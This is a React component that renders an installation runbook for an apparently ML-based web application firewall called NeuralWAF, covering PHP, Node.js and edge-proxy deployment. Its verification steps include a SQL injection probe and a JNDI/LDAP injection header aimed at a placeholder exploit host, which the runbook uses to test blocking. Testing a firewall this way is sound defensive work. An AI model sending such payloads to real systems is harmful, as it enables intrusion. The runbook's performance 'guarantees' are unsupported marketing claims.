/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { 
  Terminal, 
  Copy, 
  Check, 
  Play, 
  Layers, 
  CheckCircle2, 
  ShieldCheck, 
  Cpu, 
  Radio, 
  HardDrive,
  FileCode,
  FolderTree,
  ExternalLink,
  ChevronRight,
  Server,
  Zap
} from 'lucide-react';

interface CommandStep {
  title: string;
  command: string;
  description: string;
  expectedOutput: string;
}

export const ProductionRunbook: React.FC<{ devMode: boolean }> = ({ devMode }) => {
  const [activeTab, setActiveTab] = useState<'php' | 'node' | 'edge'>('php');
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);

  const copyToClipboard = (text: string, idx: number) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(idx);
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  const phpSteps: CommandStep[] = [
    {
      title: '1. Place NeuralWAF in Website Root Directory',
      command: 'cp -r neuralwaf/ /var/www/html/public_html/ && chmod -R 755 /var/www/html/public_html/neuralwaf',
      description: 'Upload the neuralwaf directory directly into your website root (e.g., public_html/ or /) via cPanel File Manager, FTP, SSH, or Git deployment.',
      expectedOutput: '[OK] Transferred neuralwaf/ -> public_html/neuralwaf/\n[OK] Permissions set to 0755 for PHP execution',
    },
    {
      title: '2. Activate Pre-Execution Hook (.user.ini / .htaccess)',
      command: 'echo \'auto_prepend_file = "neuralwaf/bootstrap.php"\' >> /var/www/html/public_html/.user.ini',
      description: 'Configures PHP-FPM or LiteSpeed/Apache to automatically execute the NeuralWAF bootstrap BEFORE any CMS (WordPress, Laravel, Drupal) or application code executes.',
      expectedOutput: 'Created .user.ini with auto_prepend_file = "neuralwaf/bootstrap.php"\nAlternative for Apache: php_value auto_prepend_file "neuralwaf/bootstrap.php" in .htaccess',
    },
    {
      title: '3. Initialize Local Telemetry & Rate-Limiter Storage',
      command: 'mkdir -p /var/www/html/public_html/neuralwaf/storage && chmod 775 /var/www/html/public_html/neuralwaf/storage',
      description: 'Creates the local high-speed atomic storage folder for IP sliding-window token buckets and asynchronous incident logging.',
      expectedOutput: 'directory: public_html/neuralwaf/storage created [drwxrwxr-x]',
    },
    {
      title: '4. Verify Active Root Protection via Terminal',
      command: 'curl -i -s "https://yourwebsite.com/?test=1\'%20UNION%20SELECT%20password%20FROM%20users--" | head -n 12',
      description: 'Dispatches a simulated SQL injection probe to verify the deep learning engine drops the request with HTTP 403 Forbidden before database queries run.',
      expectedOutput: 'HTTP/1.1 403 Forbidden\nContent-Type: text/html; charset=UTF-8\nX-NeuralWAF-Action: Blocked\nX-NeuralWAF-Anomaly-Score: 0.8924\n\n<!DOCTYPE html>... [NEURALWAF ROOT SHIELD // ANOMALY DETECTED]',
    },
  ];

  const nodeSteps: CommandStep[] = [
    {
      title: '1. Place NeuralWAF in Node.js Root Application Folder',
      command: 'cp -r neuralwaf/ ./ && ls -la neuralwaf/',
      description: 'Place the neuralwaf/ package in the root directory where your server.js or app.js resides.',
      expectedOutput: 'total 32\ndrwxr-xr-x  node-middleware.js\ndrwxr-xr-x  node-engine.js\ndrwxr-xr-x  proxy-server.js\ndrwxr-xr-x  storage/',
    },
    {
      title: '2. Mount Root Middleware at Top of server.js',
      command: 'const { neuralWafMiddleware } = require("./neuralwaf/node-middleware.js");\napp.use(neuralWafMiddleware({ anomalyThreshold: 0.65, rateLimitPerMinute: 180 }));',
      description: 'Mount NeuralWAF as the very first middleware in your Express, Fastify, or Connect stack before any route handlers or body parsers.',
      expectedOutput: '[NeuralWAF] Root Node.js Middleware mounted at ingress position 0\nBounded stream capacity: 64KB | Event Loop impact: < 0.2ms',
    },
    {
      title: '3. (Optional) Run Standalone Root Reverse Proxy Wrapper',
      command: 'PORT=80 APP_PORT=3001 node neuralwaf/proxy-server.js',
      description: 'For hosting environments using Node.js Passenger or PM2, run the zero-dependency reverse proxy wrapper to isolate backend processes.',
      expectedOutput: '[NeuralWAF] Root Proxy listening on port 80 -> 127.0.0.1:3001\nLayer 7 isolation active | Memory ceiling: 64MB',
    },
    {
      title: '4. Execute End-to-End Node.js Ingress Verification',
      command: 'curl -i -s -H "User-Agent: \${jndi:ldap://198.51.100.1:1389/Exploit}" "http://localhost:3000/api/v1/search?q=test"',
      description: 'Sends an anomalous high-entropy sequence to verify instant HTTP 403 termination without consuming backend Node compute.',
      expectedOutput: 'HTTP/1.1 403 Forbidden\nContent-Type: application/json\nX-NeuralWAF-Action: Blocked\nX-NeuralWAF-Anomaly-Score: 0.9412\n\n{"error":"Forbidden","statusCode":403,"shield":"NeuralWAF Root Node.js Engine"}',
    },
  ];

  const edgeSteps: CommandStep[] = [
    {
      title: '1. Launch Complete Distributed Edge Proxy',
      command: 'docker compose up -d --build',
      description: 'Orchestrates the Edge Proxy (:8080 Data Plane, :9090 Control Plane), TensorRT inference backend (:50051), and Kafka telemetry bus (:9092).',
      expectedOutput: '[+] Running 4/4\n ✔ Container neuralwaf-inference-engine  Started\n ✔ Container neuralwaf-kafka             Started\n ✔ Container protected-backend            Started\n ✔ Container neuralwaf-edge-proxy        Started',
    },
    {
      title: '2. Verify Control Plane Liveness & Readiness Probes',
      command: 'curl -i http://localhost:9090/healthz && curl -s http://localhost:9090/readyz | jq',
      description: 'Queries the isolated management port to confirm gRPC inference connection pool status and Kafka ring buffer health.',
      expectedOutput: 'HTTP/1.1 200 OK\nOK\n{\n  "status": "ready",\n  "inference_plane": { "total_calls": 0, "circuit_open": false },\n  "telemetry_plane": { "queue_depth": 0, "dropped": 0 }\n}',
    },
    {
      title: '3. Scrape Production Prometheus Telemetry',
      command: 'curl -s http://localhost:9090/metrics | grep -E "^waf_"',
      description: 'Retrieves live Prometheus metrics: waf_http_requests_total, waf_inference_latency_microseconds, and active connection gauges.',
      expectedOutput: 'waf_http_requests_total{action="allowed",method="GET"} 142\nwaf_http_requests_total{action="blocked",method="GET"} 38\nwaf_active_connections 12',
    },
  ];

  const activeSteps = activeTab === 'php' ? phpSteps : activeTab === 'node' ? nodeSteps : edgeSteps;

  return (
    <div className="space-y-6">
      {/* Header and Stack Selector */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-lg flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="px-2.5 py-0.5 rounded text-[10px] font-mono bg-violet-500/20 text-violet-300 border border-violet-500/30 font-semibold">
              ROOT DIRECTORY DEPLOYMENT
            </span>
            <span className="px-2.5 py-0.5 rounded text-[10px] font-mono bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-semibold">
              STANDARD WEB HOSTING COMPATIBLE
            </span>
          </div>
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <Terminal className="w-5 h-5 text-emerald-400" />
            Root Installation Runbook & Setup Guide
          </h2>
          <p className="text-xs text-slate-400 mt-1 max-w-2xl">
            {devMode
              ? 'Step-by-step instructions for deploying NeuralWAF directly into your website root directory (public_html/ or /) on Apache, LiteSpeed, Nginx, or Node.js runtimes.'
              : 'Zero-configuration deployment guide: install directly into your website files with no server administrative privileges required.'}
          </p>
        </div>

        {/* Stack Selection Tabs */}
        <div className="flex items-center bg-slate-950 p-1.5 rounded-lg border border-slate-800">
          <button
            onClick={() => setActiveTab('php')}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-mono transition-all ${
              activeTab === 'php'
                ? 'bg-violet-600 text-white font-bold shadow-md shadow-violet-600/30'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            <Server className="w-3.5 h-3.5 text-violet-300" />
            PHP Root (public_html)
          </button>
          <button
            onClick={() => setActiveTab('node')}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-mono transition-all ${
              activeTab === 'node'
                ? 'bg-emerald-600 text-white font-bold shadow-md shadow-emerald-600/30'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            <Cpu className="w-3.5 h-3.5 text-emerald-300" />
            Node.js Root
          </button>
          <button
            onClick={() => setActiveTab('edge')}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-mono transition-all ${
              activeTab === 'edge'
                ? 'bg-cyan-600 text-white font-bold shadow-md shadow-cyan-600/30'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            <Radio className="w-3.5 h-3.5 text-cyan-300" />
            Distributed Edge (Go)
          </button>
        </div>
      </div>

      {/* Root Directory Layout Card */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-md">
        <h3 className="text-sm font-bold text-white flex items-center gap-2 mb-3">
          <FolderTree className="w-4 h-4 text-indigo-400" />
          Target Website Root Directory Layout ({activeTab === 'php' ? 'PHP Environment' : activeTab === 'node' ? 'Node.js Environment' : 'Edge Proxy Environment'})
        </h3>
        <div className="bg-slate-950 rounded-lg p-3.5 border border-slate-800/90 font-mono text-xs text-slate-300 overflow-x-auto">
          {activeTab === 'php' && (
            <pre className="text-violet-300 leading-relaxed">{`public_html/ (Website Root)
├── .user.ini                   <- Sets auto_prepend_file = "neuralwaf/bootstrap.php" (PHP-FPM)
├── .htaccess                   <- Apache & LiteSpeed fallback auto-prepend hook
├── index.php                   <- Your existing CMS (WordPress, Laravel, Drupal, PrestaShop)
└── neuralwaf/                  <- NeuralWAF Root Package
    ├── bootstrap.php           <- Intercepts BEFORE index.php or database executes
    ├── engine.php              <- Pure PHP deep learning sequence reconstruction scorer
    ├── config.php              <- Anomaly threshold (0.65), rate limits, IP whitelist
    └── storage/                <- Atomic per-IP rate buckets & telemetry event logs`}</pre>
          )}
          {activeTab === 'node' && (
            <pre className="text-emerald-300 leading-relaxed">{`website_root/ (Application Root)
├── server.js                   <- app.use(neuralWafMiddleware({ threshold: 0.65 }))
├── package.json
└── neuralwaf/                  <- NeuralWAF Root Package
    ├── node-middleware.js      <- Express / Fastify / Connect root middleware hook
    ├── node-engine.js          <- V8-optimized sequence vectorization & anomaly scorer
    ├── proxy-server.js         <- Standalone reverse proxy wrapper for Passenger / PM2
    └── storage/                <- In-memory & local telemetry event logs`}</pre>
          )}
          {activeTab === 'edge' && (
            <pre className="text-cyan-300 leading-relaxed">{`edge_gateway/ (Dedicated Edge Host)
├── cmd/edge-proxy/main.go      <- High-concurrency reverse proxy on port :8080
├── internal/inference/client.go<- gRPC client to LSTM Autoencoder backend on :50051
├── internal/telemetry/kafka.go <- Non-blocking Kafka producer streaming to Zima MDR
└── deploy/docker-compose.yml   <- Multi-plane orchestration stack`}</pre>
          )}
        </div>
      </div>

      {/* Step by Step Execution Instructions */}
      <div className="space-y-4">
        {activeSteps.map((step, idx) => (
          <div key={idx} className="bg-slate-900 border border-slate-800 rounded-xl p-4 shadow-md space-y-2.5">
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold text-white font-mono flex items-center gap-2">
                <ChevronRight className="w-4 h-4 text-indigo-400" />
                {step.title}
              </span>
              <button
                onClick={() => copyToClipboard(step.command, idx)}
                className="flex items-center gap-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded text-xs font-mono transition-all"
              >
                {copiedIndex === idx ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                {copiedIndex === idx ? 'Copied' : 'Copy'}
              </button>
            </div>

            <p className="text-xs text-slate-400 leading-relaxed pl-6">
              {step.description}
            </p>

            {/* Terminal Command Box */}
            <div className="bg-slate-950 rounded-lg border border-slate-800/90 p-3 font-mono text-xs text-emerald-400 overflow-x-auto flex items-center justify-between gap-4">
              <div className="flex items-center gap-2">
                <span className="text-slate-600 select-none">$</span>
                <span className="text-slate-100 whitespace-pre">{step.command}</span>
              </div>
            </div>

            {/* Expected Output Box */}
            <div className="bg-slate-950/70 rounded-lg border border-slate-800/50 p-2.5 font-mono text-[11px] text-slate-400 overflow-x-auto">
              <div className="text-[10px] uppercase tracking-wider text-slate-500 mb-1">Expected Output:</div>
              <pre className="text-slate-300 whitespace-pre leading-relaxed">{step.expectedOutput}</pre>
            </div>
          </div>
        ))}
      </div>

      {/* Production Architecture Quick Reference */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-lg space-y-3">
        <h3 className="text-sm font-bold text-white flex items-center gap-2">
          <ShieldCheck className="w-4 h-4 text-emerald-400" />
          Pre-Execution Interception Guarantees
        </h3>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs font-mono">
          <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
            <div className="text-violet-400 font-bold">1. Zero Framework Latency</div>
            <div className="text-slate-400 text-[11px] mt-1">
              Blocks malicious requests before PHP-FPM or Node boots framework routes, saving 98%+ of database and CPU load.
            </div>
          </div>
          <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
            <div className="text-emerald-400 font-bold">2. Bounded Memory Ceiling</div>
            <div className="text-slate-400 text-[11px] mt-1">
              Strict 64KB bounded stream inspection guarantees zero memory leaks or worker thread exhaustion during DDoS floods.
            </div>
          </div>
          <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
            <div className="text-cyan-400 font-bold">3. Pure Math, Zero Regex</div>
            <div className="text-slate-400 text-[11px] mt-1">
              Replaces vulnerable regular expressions with character bigram sequence reconstruction loss, eliminating ReDoS vulnerabilities.
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
